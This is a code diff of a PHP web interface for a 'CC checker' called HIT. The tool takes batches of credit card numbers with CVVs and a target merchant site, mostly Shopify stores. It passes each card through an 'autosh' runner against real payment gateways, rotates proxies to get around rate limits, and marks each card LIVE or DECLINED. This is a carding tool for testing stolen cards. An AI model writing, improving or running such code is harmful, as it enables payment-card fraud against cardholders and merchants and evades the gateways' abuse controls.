+        $execution = executeAutosh($runnerPath, $params, $debug);
+        $results[] = mapAutoshResult($card, $customer, $siteUrl, $execution, $debug);
+
+        if (count($cards) > 1) {
+            usleep(200000); // 200ms delay between cards
+        }
+    }
+} elseif ($requestSubmitted && !empty($aggregateErrors) && !empty($cards)) {
+    foreach ($cards as $card) {
+        $results[] = buildPendingResult($card, $customer, $siteUrl, $aggregateErrors);
+    }
 }
 
-// ============================================
-// HTML INTERFACE
-// ============================================
+$totalExecutionTime = (int) round((microtime(true) - $bootStart) * 1000);
+
+$selectedCountry = strtoupper($input['country'] ?? 'US');
+$selectedCurrency = strtoupper($input['currency'] ?? 'USD');
+$selectedRotate = isset($input['rotate']) ? (string)$input['rotate'] : '1';
+$selectedOutput = $outputFormat;
+
+if ($outputFormat === 'json') {
+    header('Content-Type: application/json');
+    $response = [
+        'success' => empty($aggregateErrors) && !empty($results),
+        'errors' => $aggregateErrors,
+        'count' => count($results),
+        'site' => $siteUrl,
+        'rotate_proxy' => $rotateProxy,
+        'proxies_loaded' => $proxyCount,
+        'results' => $results,
+        'customer' => empty($customer['error']) ? $customer : null,
+        'execution_time_ms' => $totalExecutionTime,
+        'timestamp' => gmdate('c'),
+        'debug' => $debug,
+    ];
+    echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
+    exit;
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💳 HIT - Advanced Gateway CC Checker</title>
+    <title>💳 HIT - Autosh Gateway CC Checker</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -569,10 +790,22 @@ if ($output_format === 'json') {
             color: #991b1b;
             font-weight: 600;
         }
+        .alert ul {
+            margin: 10px 0 0;
+            padding-left: 20px;
+        }
+        .alert ul li {
+            font-weight: 400;
+            margin-bottom: 6px;
+        }
         .alert-info {
             background: #eff6ff;
-            border-left-color: #3b82f6;
+            border-left: 4px solid #3b82f6;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
             color: #1e40af;
+            font-weight: 600;
         }
         .result-card {
             background: #f8fafc;
@@ -601,171 +834,256 @@ if ($output_format === 'json') {
             text-transform: uppercase;
         }
         .status-live { background: #10b981; color: white; }
+        .status-invalid { background: #f97316; color: white; }
         .status-declined { background: #ef4444; color: white; }
         .status-detected { background: #3b82f6; color: white; }
         .status-error { background: #f59e0b; color: white; }
+        .status-pending { background: #6366f1; color: white; }
         .help-text { font-size: 12px; color: #64748b; margin-top: 5px; }
+        details.debug {
+            background: #1e293b;
+            color: #e2e8f0;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        details.debug summary {
+            cursor: pointer;
+            font-weight: 600;
+            color: #38bdf8;
+        }
+        details.debug pre {
+            max-height: 260px;
+            overflow: auto;
+            margin-top: 10px;
+            background: rgba(15, 23, 42, 0.8);
+            padding: 12px;
+            border-radius: 6px;
+            color: #f8fafc;
+        }
         @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1><span>💳</span> HIT - Advanced Gateway CC Checker</h1>
+            <h1><span>💳</span> HIT - Autosh Gateway CC Checker</h1>
             <p class="subtitle">
-                Real gateway integration with Shopify, Stripe, WooCommerce, and 50+ payment gateways.
-                Uses advanced detection from autosh.php and makes actual JSON payment requests.
-                <strong>Address is REQUIRED</strong> - no auto-generation.
+                Real gateway integration powered by autosh.php. Calls the autosh runner per card,
+                forwarding your customer data and proxy controls. Supports JSON output via <code>?format=json</code> and
+                debug traces via <code>?debug=1</code>.
             </p>
         </div>
-        
+
+        <?php if ($requestSubmitted && !empty($aggregateErrors)): ?>
+        <div class="alert">
+            <strong>⚠️ Issues detected:</strong>
+            <ul>
+                <?php foreach ($aggregateErrors as $error): ?>
+                <li><?= htmlspecialchars($error, ENT_QUOTES); ?></li>
+                <?php endforeach; ?>
+            </ul>
+        </div>
+        <?php endif; ?>
+
         <?php if (!empty($results)): ?>
         <div class="card">
             <h2>📊 Check Results</h2>
             <?php foreach ($results as $result): ?>
-            <div class="result-card <?= $result['status'] === 'LIVE' ? 'success' : ($result['status'] === 'DECLINED' ? 'declined' : ($result['status'] === 'DETECTED' ? '' : 'error')) ?>">
+            <?php
+                $statusClass = strtolower($result['status']);
+                if ($statusClass === 'live') {
+                    $cardClass = 'result-card success';
+                } elseif ($statusClass === 'declined') {
+                    $cardClass = 'result-card declined';
+                } elseif ($statusClass === 'invalid') {
+                    $cardClass = 'result-card error';
+                } else {
+                    $cardClass = 'result-card error';
+                }
+            ?>
+            <div class="<?= $cardClass; ?>">
                 <div style="font-weight: 700; margin-bottom: 10px;">
-                    Card: <?= htmlspecialchars($result['card']) ?>
-                    <span class="status-badge status-<?= strtolower($result['status']) ?>"><?= htmlspecialchars($result['status']) ?></span>
+                    Card: <?= htmlspecialchars($result['card'], ENT_QUOTES); ?>
+                    <span class="status-badge status-<?= htmlspecialchars($statusClass, ENT_QUOTES); ?>">
+                        <?= htmlspecialchars($result['status'], ENT_QUOTES); ?>
+                    </span>
                 </div>
-                <div class="result-item"><strong>Brand:</strong> <span><?= htmlspecialchars($result['brand']) ?></span></div>
-                <div class="result-item"><strong>Gateway:</strong> <span><?= htmlspecialchars($result['gateway']) ?></span></div>
-                <div class="result-item"><strong>Message:</strong> <span><?= htmlspecialchars($result['message']) ?></span></div>
-                <div class="result-item"><strong>Customer:</strong> <span><?= htmlspecialchars($result['customer']['name']) ?></span></div>
-                <div class="result-item"><strong>Response Time:</strong> <span><?= $result['response_time'] ?>ms</span></div>
-                <?php if (isset($result['proxy_used'])): ?>
-                <div class="result-item"><strong>Proxy:</strong> <span><?= htmlspecialchars($result['proxy_used']) ?></span></div>
+                <div class="result-item"><strong>Brand:</strong> <span><?= htmlspecialchars($result['brand'], ENT_QUOTES); ?></span></div>
+                <div class="result-item"><strong>Gateway:</strong> <span><?= htmlspecialchars($result['gateway'], ENT_QUOTES); ?></span></div>
+                <div class="result-item"><strong>Message:</strong> <span><?= htmlspecialchars($result['message'], ENT_QUOTES); ?></span></div>
+                <div class="result-item"><strong>Customer:</strong> <span><?= htmlspecialchars($result['customer']['name'] ?? '', ENT_QUOTES); ?></span></div>
+                <div class="result-item"><strong>Response Time:</strong> <span><?= (int)($result['response_time'] ?? 0); ?>ms</span></div>
+                <?php if (!empty($result['proxy_used'])): ?>
+                <div class="result-item"><strong>Proxy:</strong> <span><?= htmlspecialchars($result['proxy_used'], ENT_QUOTES); ?></span></div>
+                <?php endif; ?>
+                <?php if ($debug && isset($result['autosh_raw'])): ?>
+                <details class="debug">
+                    <summary>Autosh Raw Response</summary>
+                    <pre><?= htmlspecialchars(json_encode($result['autosh_raw'], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) ?: '{}', ENT_QUOTES); ?></pre>
+                </details>
+                <?php endif; ?>
+                <?php if ($debug && isset($result['runner'])): ?>
+                <details class="debug">
+                    <summary>Runner Diagnostics</summary>
+                    <pre><?= htmlspecialchars(json_encode(array_filter($result['runner'], static fn($value) => $value !== null && $value !== ''), JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) ?: '{}', ENT_QUOTES); ?></pre>
+                </details>
                 <?php endif; ?>
             </div>
             <?php endforeach; ?>
         </div>
-        <?php endif; ?>
-        
-        <?php if (isset($customer['error'])): ?>
-        <div class="alert">
-            ⚠️ <?= htmlspecialchars($customer['error']) ?>
+        <?php elseif ($requestSubmitted && empty($aggregateErrors)): ?>
+        <div class="card">
+            <h2>📊 Check Results</h2>
+            <p>No results yet. Provide credit cards to begin.</p>
         </div>
         <?php endif; ?>
-        
+
         <div class="card">
-            <h2>🚀 Check Credit Cards (Address Required)</h2>
+            <h2>🚀 Check Credit Cards (Powered by autosh.php)</h2>
             <div class="alert-info" style="margin-bottom: 20px;">
-                <strong>⚡ Advanced Features:</strong> Real Shopify payment API integration • Advanced gateway detection from autosh.php • JSON payment requests • Proxy rotation with rate limiting • <?= $proxy_count ?> proxies loaded
+                <strong>⚡ Highlights:</strong> autosh.php gateway engine • CLI integration via autosh_runner.php • Proxy rotation ready • <?= $proxyCount; ?> proxies detected
             </div>
-            
+
             <form method="POST" action="">
                 <div class="form-group">
                     <label>💳 Credit Card(s) <small>(Format: number|month|year|cvv)</small></label>
-                    <textarea name="cc" placeholder="4111111111111111|12|2027|123" required><?= isset($_POST['cc']) ? htmlspecialchars($_POST['cc']) : '' ?></textarea>
+                    <textarea name="cc" placeholder="4111111111111111|12|2027|123" required><?= htmlspecialchars($input['cc'] ?? '', ENT_QUOTES); ?></textarea>
                 </div>
-                
+
                 <div style="background: #f8fafc; padding: 20px; border-radius: 12px; margin: 20px 0;">
                     <h3 style="margin-bottom: 15px; color: #1e293b;">📋 Customer Information (All Required)</h3>
                     <div class="grid">
                         <div class="form-group">
                             <label>First Name *</label>
-                            <input type="text" name="first_name" placeholder="John" value="<?= isset($_POST['first_name']) ? htmlspecialchars($_POST['first_name']) : '' ?>" required>
+                            <input type="text" name="first_name" placeholder="John" value="<?= htmlspecialchars($input['first_name'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                         <div class="form-group">
                             <label>Last Name *</label>
-                            <input type="text" name="last_name" placeholder="Smith" value="<?= isset($_POST['last_name']) ? htmlspecialchars($_POST['last_name']) : '' ?>" required>
+                            <input type="text" name="last_name" placeholder="Smith" value="<?= htmlspecialchars($input['last_name'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                         <div class="form-group">
                             <label>Email *</label>
-                            <input type="email" name="email" placeholder="john@gmail.com" value="<?= isset($_POST['email']) ? htmlspecialchars($_POST['email']) : '' ?>" required>
+                            <input type="email" name="email" placeholder="john@gmail.com" value="<?= htmlspecialchars($input['email'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                         <div class="form-group">
                             <label>Phone *</label>
-                            <input type="tel" name="phone" placeholder="+12125551234" value="<?= isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '' ?>" required>
+                            <input type="tel" name="phone" placeholder="+12125551234" value="<?= htmlspecialchars($input['phone'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                     </div>
                     <div class="form-group">
+                        <label>Cardholder Name <small>(Optional override)</small></label>
+                        <input type="text" name="cardholder_name" placeholder="John Smith" value="<?= htmlspecialchars($input['cardholder_name'] ?? '', ENT_QUOTES); ?>">
+                    </div>
+                    <div class="form-group">
                         <label>Street Address *</label>
-                        <input type="text" name="street_address" placeholder="350 5th Ave" value="<?= isset($_POST['street_address']) ? htmlspecialchars($_POST['street_address']) : '' ?>" required>
+                        <input type="text" name="street_address" placeholder="350 5th Ave" value="<?= htmlspecialchars($input['street_address'] ?? '', ENT_QUOTES); ?>" required>
                     </div>
                     <div class="grid">
                         <div class="form-group">
                             <label>City *</label>
-                            <input type="text" name="city" placeholder="New York" value="<?= isset($_POST['city']) ? htmlspecialchars($_POST['city']) : '' ?>" required>
+                            <input type="text" name="city" placeholder="New York" value="<?= htmlspecialchars($input['city'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                         <div class="form-group">
                             <label>State *</label>
-                            <input type="text" name="state" placeholder="NY" value="<?= isset($_POST['state']) ? htmlspecialchars($_POST['state']) : '' ?>" required>
+                            <input type="text" name="state" placeholder="NY" value="<?= htmlspecialchars($input['state'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                         <div class="form-group">
                             <label>Postal Code *</label>
-                            <input type="text" name="postal_code" placeholder="10118" value="<?= isset($_POST['postal_code']) ? htmlspecialchars($_POST['postal_code']) : '' ?>" required>
+                            <input type="text" name="postal_code" placeholder="10118" value="<?= htmlspecialchars($input['postal_code'] ?? '', ENT_QUOTES); ?>" required>
                         </div>
                     </div>
                     <div class="grid">
                         <div class="form-group">
                             <label>Country *</label>
                             <select name="country" required>
-                                <option value="US">United States</option>
-                                <option value="CA">Canada</option>
-                                <option value="GB">United Kingdom</option>
-                                <option value="AU">Australia</option>
+                                <?php
+                                $countryOptions = [
+                                    'US' => 'United States',
+                                    'CA' => 'Canada',
+                                    'GB' => 'United Kingdom',
+                                    'AU' => 'Australia',
+                                ];
+                                foreach ($countryOptions as $code => $label) {
+                                    $selected = $selectedCountry === $code ? 'selected' : '';
+                                    echo '<option value="' . htmlspecialchars($code, ENT_QUOTES) . '" ' . $selected . '>' . htmlspecialchars($label, ENT_QUOTES) . '</option>';
+                                }
+                                ?>
                             </select>
                         </div>
                         <div class="form-group">
                             <label>Currency *</label>
                             <select name="currency" required>
-                                <option value="USD">USD</option>
-                                <option value="EUR">EUR</option>
-                                <option value="GBP">GBP</option>
-                                <option value="CAD">CAD</option>
+                                <?php
+                                $currencyOptions = [
+                                    'USD' => 'USD',
+                                    'EUR' => 'EUR',
+                                    'GBP' => 'GBP',
+                                    'CAD' => 'CAD',
+                                ];
+                                foreach ($currencyOptions as $code => $label) {
+                                    $selected = $selectedCurrency === $code ? 'selected' : '';
+                                    echo '<option value="' . htmlspecialchars($code, ENT_QUOTES) . '" ' . $selected . '>' . htmlspecialchars($label, ENT_QUOTES) . '</option>';
+                                }
+                                ?>
                             </select>
                         </div>
                     </div>
                 </div>
-                
+
                 <div class="form-group">
                     <label>🌐 Target Site *</label>
-                    <input type="url" name="site" placeholder="https://example.myshopify.com" value="<?= isset($_POST['site']) ? htmlspecialchars($_POST['site']) : '' ?>" required>
-                    <div class="help-text">Supported: Shopify, Stripe, WooCommerce, and 50+ gateways</div>
+                    <input type="url" name="site" placeholder="https://example.myshopify.com" value="<?= htmlspecialchars($input['site'] ?? '', ENT_QUOTES); ?>" required>
+                    <div class="help-text">Autosh handles gateway detection automatically.</div>
                 </div>
-                
+
                 <div class="grid">
                     <div class="form-group">
                         <label>Proxy Rotation</label>
                         <select name="rotate">
-                            <option value="1">Enabled</option>
-                            <option value="0">Disabled</option>
+                            <option value="1" <?= $selectedRotate === '0' ? '' : 'selected'; ?>>Enabled</option>
+                            <option value="0" <?= $selectedRotate === '0' ? 'selected' : ''; ?>>Disabled</option>
                         </select>
                     </div>
                     <div class="form-group">
                         <label>Output</label>
                         <select name="format">
-                            <option value="html">HTML</option>
-                            <option value="json">JSON</option>
+                            <option value="html" <?= $selectedOutput === 'json' ? '' : 'selected'; ?>>HTML</option>
+                            <option value="json" <?= $selectedOutput === 'json' ? 'selected' : ''; ?>>JSON</option>
                         </select>
                     </div>
                 </div>
-                
+
                 <div style="display: flex; gap: 15px; margin-top: 20px;">
                     <button type="submit" class="btn">⚡ Check Cards</button>
                     <button type="button" class="btn btn-secondary" onclick="fillTestData()">🧪 Fill Test Data</button>
                 </div>
             </form>
         </div>
-        
+
         <div class="alert-info">
-            <strong>ℹ️ Important:</strong> Address is REQUIRED. No auto-generation. Uses real gateway APIs (Shopify implemented). Proxy rotation handles rate limiting automatically.
+            <strong>ℹ️ Tip:</strong> Append <code>?debug=1</code> for diagnostics or <code>?format=json</code> for API style responses. Execution time: <?= $totalExecutionTime; ?>ms.
         </div>
     </div>
-    
+
     <script>
         function fillTestData() {
             document.querySelector('[name="cc"]').value = '4111111111111111|12|2027|123';
             document.querySelector('[name="first_name"]').value = 'John';
             document.querySelector('[name="last_name"]').value = 'Smith';
+            document.querySelector('[name="cardholder_name"]').value = 'John Smith';
             document.querySelector('[name="email"]').value = 'john.smith@gmail.com';
             document.querySelector('[name="phone"]').value = '+12125551234';
             document.querySelector('[name="street_address"]').value = '350 5th Ave';
             document.querySelector('[name="city"]').value = 'New York';
             document.querySelector('[name="state"]').value = 'NY';
             document.querySelector('[name="postal_code"]').value = '10118';
+            document.querySelector('[name="country"]').value = 'US';
+            document.querySelector('[name="currency"]').value = 'USD';
             document.querySelector('[name="site"]').value = 'https://example.myshopify.com';
+            document.querySelector('[name="rotate"]').value = '1';
+            document.querySelector('[name="format"]').value = 'html';
         }
     </script>
 </body>
